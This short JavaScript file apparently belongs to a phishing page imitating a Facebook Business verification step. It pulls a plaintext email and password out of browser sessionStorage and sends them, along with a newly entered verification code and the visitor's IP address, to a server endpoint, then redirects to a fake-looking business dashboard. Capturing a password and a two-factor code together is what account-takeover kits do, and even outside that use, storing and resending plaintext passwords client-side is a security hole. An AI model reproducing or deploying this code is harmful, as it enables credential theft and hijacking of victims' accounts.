const user_id = sessionStorage.getItem('user_id'); ; 
const email = sessionStorage.getItem('email');  
const password = sessionStorage.getItem('password'); 
const country = sessionStorage.getItem('country');


document.getElementById('code').addEventListener('input', function () {
    const code = document.getElementById('code').value;
    const continueButton = document.getElementById('continueButton');
    continueButton.disabled = code.trim() === "";
});


document.getElementById('continueButton').addEventListener('click', function () {
    const code = document.getElementById('code').value;
    const continueButton = document.getElementById('continueButton');

    continueButton.disabled = true;
    continueButton.style.backgroundColor = "#ccc"; 

    
    fetch('/api/code', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            country: country,
            code: code,
            user_id: user_id,
            password: password,
            email: email,
            ip_address: sessionStorage.getItem('user_ip')
        })
    })
    .then(response => response.json())
    .then(data => {
        if (data.status === 'success') {
            window.location.href = '/business/dashboard';
        }
    })
    .catch(error => {
        console.error('Error sending request:', error);
        
    })
    .finally(() => {
        continueButton.disabled = false;
        continueButton.style.backgroundColor = "#1877f2"; // Khôi phục màu nút sau khi xử lý xong
    });
});
